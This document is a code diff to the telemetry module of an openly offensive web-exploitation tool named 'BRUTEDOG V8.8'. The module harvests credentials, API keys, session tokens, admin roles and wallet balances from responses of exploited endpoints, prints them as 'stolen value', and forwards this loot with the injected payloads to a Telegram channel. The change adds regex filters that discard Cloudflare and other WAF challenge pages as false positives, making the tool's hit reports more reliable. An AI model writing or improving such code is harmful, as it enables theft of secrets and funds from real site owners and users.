@@ -1,15 +1,11 @@
 #!/usr/bin/env python3
 """
-TELEMETRY.PY v8.8 — Live Offensive Streamer & Automated Loot Exfiltration Handler (Elite Red Team Adversarial Edition)
-Features:
-- Automated high-value loot parsing (JWTs, API keys, wallet balances, admin tokens)
-- Zero-disk in-memory exfiltration packaging
-- Real-time zero-delay proof-of-work terminal rendering
-- Zero-noise Telegram notification dispatch restricted strictly to verified high-value breach loot
+TELEMETRY.PY v8.8 — Live Offensive Streamer & Filtered Loot Exfiltration Handler
 """
-import sys
-import json
 import asyncio
+import json
+import re
+import sys
 from modules.telegram_notifier import send_telegram_alert
 
 CYAN = "\033[96m"
@@ -22,51 +18,133 @@ MATRIX_GREEN = "\033[38;5;46m"
 NEON_BLUE = "\033[38;5;51m"
 MAGENTA = "\033[95m"
 
+CHALLENGE_SIGNATURES = [
+    r"<title>\s*security check\s*</title>",
+    r"just a moment\.\.\.",
+    r"checking your browser",
+    r"cf-browser-verification",
+    r"cdn-cgi/challenge-platform",
+    r"__cf_chl_",
+    r"ddos-guard",
+    r"incapsula",
+    r"sucuri website firewall",
+    r"access denied.*cloudflare",
+    r"attention required!.*cloudflare",
+    r'<meta\s+name=["\']robots["\']\s+content=["\']noindex,\s*nofollow["\']',
+]
+
+_CHALLENGE_REGEX = re.compile("|".join(CHALLENGE_SIGNATURES), re.IGNORECASE)
+
+
+def _extract_text_from_proof(proof_data) -> str:
+    if isinstance(proof_data, dict):
+        parts = []
+        for k in ("response_excerpt", "body_sample", "proof", "evidence", "detail", "reason"):
+            if k in proof_data and proof_data[k] is not None:
+                parts.append(str(proof_data[k]))
+        return "\n".join(parts)
+    if proof_data is not None:
+        return str(proof_data)
+    return ""
+
+
+def is_challenge_or_false_positive(exploit_type, response_body="", proof_data=None) -> tuple[bool, str]:
+    """
+    Returns (True, reason) if the response looks like a WAF/challenge page,
+    generic HTML shell, or unverified hit rather than real exploit proof.
+    """
+    body_str = response_body if isinstance(response_body, str) else ""
+    proof_str = _extract_text_from_proof(proof_data)
+    combined = f"{body_str}\n{proof_str}".strip()
+
+    if isinstance(proof_data, dict):
+        status = proof_data.get("status")
+        if status in (401, 403, 404, 405, 406, 429, 502, 503):
+            return True, f"HTTP {status} non-exploit response"
+
+    if _CHALLENGE_REGEX.search(combined):
+        return True, "WAF / Security Check challenge page signature detected"
+
+    stripped = combined.lstrip()
+    lowered = stripped.lower()
+    is_html = lowered.startswith("<!doctype html") or lowered.startswith("<html") or "<head>" in lowered[:400]
+
+    exploit_upper = str(exploit_type or "").upper()
+    html_allowed_types = {"XSS", "DOM_XSS", "OPEN_REDIRECT", "CORS_MISCONFIG", "HTML_INJECTION"}
+    if is_html and not any(t in exploit_upper for t in html_allowed_types):
+        return True, "Generic HTML document returned for non-HTML exploit class"
+
+    return False, ""
+
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous telemetry streams."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(send_telegram_alert(loot_type, details))
+        else:
+            asyncio.run(send_telegram_alert(loot_type, details))
     except RuntimeError:
         try:
             asyncio.run(send_telegram_alert(loot_type, details))
         except Exception:
             pass
 
+
 def extract_valuable_loot(response_body):
-    """Parses response bodies to automatically harvest high-value credentials, keys, and tokens."""
+    """Parses structured JSON response bodies to harvest high-value fields."""
     looted_assets = {}
     if not response_body or not isinstance(response_body, str):
+        return looted_assets
+
+    stripped = response_body.lstrip()
+    if stripped.startswith("<"):
         return looted_assets
 
     try:
         data = json.loads(response_body)
         if isinstance(data, dict):
             for k, v in data.items():
-                if any(sub in k.lower() for sub in ["token", "key", "secret", "balance", "wallet", "admin", "role", "session", "user_id"]):
+                if any(
+                    sub in str(k).lower()
+                    for sub in ["token", "key", "secret", "balance", "wallet", "admin", "role", "session", "user_id"]
+                ):
                     looted_assets[k] = v
-    except json.JSONDecodeError:
+    except Exception:
         pass
 
     return looted_assets
 
+
 def stream_proof(exploit_type, endpoint, payload, response_body, proof_data):
     """
-    Instantly streams verified proof-of-work, automatically extracts exfiltrated loot to the terminal,
-    and broadcasts verified loot directly to Telegram under zero-noise rules.
+    Filters out WAF challenge pages and false positives before rendering
+    verified proof-of-work and broadcasting to Telegram.
     """
-    sys.stdout.write(f"\n{RED}{BOLD}[***] BRUTEDOG V8.8 — LIVE EXPLOIT VERIFIED: {exploit_type.upper()} [***]{RESET}\n")
+    body_str = response_body if isinstance(response_body, str) else str(response_body or "")
+    filtered, reason = is_challenge_or_false_positive(exploit_type, body_str, proof_data)
+    if filtered:
+        sys.stdout.write(
+            f"{YELLOW}[~] Suppressed false positive [{exploit_type}] on {endpoint}: {reason}{RESET}\n"
+        )
+        sys.stdout.flush()
+        return False
+
+    sys.stdout.write(
+        f"\n{RED}{BOLD}[***] BRUTEDOG V8.8 — LIVE EXPLOIT VERIFIED: {str(exploit_type).upper()} [***]{RESET}\n"
+    )
     sys.stdout.write(f"  ├── Target Endpoint : {NEON_BLUE}{endpoint}{RESET}\n")
-    sys.stdout.write(f"  ├── Injected Payload: {YELLOW}{json.dumps(payload)}{RESET}\n")
-    
-    auto_loot = extract_valuable_loot(response_body)
+    sys.stdout.write(f"  ├── Injected Payload: {YELLOW}{json.dumps(payload, default=str)}{RESET}\n")
+
+    auto_loot = extract_valuable_loot(body_str)
     if auto_loot:
         sys.stdout.write(f"  ├── {MAGENTA}AUTOMATED LOOT EXPORT (HIGH-VALUE ASSETS):{RESET}\n")
         for l_key, l_val in auto_loot.items():
             sys.stdout.write(f"  │     └── {CYAN}{l_key}{RESET} : {MATRIX_GREEN}{l_val}{RESET}\n")
 
-    sys.stdout.write(f"  └── STOLEN VALUE / PROOF:\n")
-    
+    sys.stdout.write("  └── STOLEN VALUE / PROOF:\n")
+
     proof_dict = {}
     if isinstance(proof_data, dict):
         for k, v in proof_data.items():
@@ -75,16 +153,16 @@ def stream_proof(exploit_type, endpoint, payload, response_body, proof_data):
     else:
         sys.stdout.write(f"      └── {MATRIX_GREEN}{str(proof_data)[:300]}{RESET}\n")
         proof_dict["proof"] = str(proof_data)
-        
-    sys.stdout.write(f"  └── Response Preview: {GREEN}{response_body[:150]}...{RESET}\n\n")
+
+    sys.stdout.write(f"  └── Response Preview: {GREEN}{body_str[:150]}...{RESET}\n\n")
     sys.stdout.flush()
 
-    # BROADCAST EXPLOIT PROOF & LOOT STRAIGHT TO TELEGRAM (Zero-Noise Filtered)
     telegram_payload = {
         "endpoint": endpoint,
         "payload": str(payload),
         "auto_loot": auto_loot,
         "proof": proof_dict,
-        "response_preview": response_body[:300]
+        "response_preview": body_str[:300],
     }
     broadcast_tg_alert_sync(f"Verified Exploit Loot [{exploit_type}]", telegram_payload)
+    return True
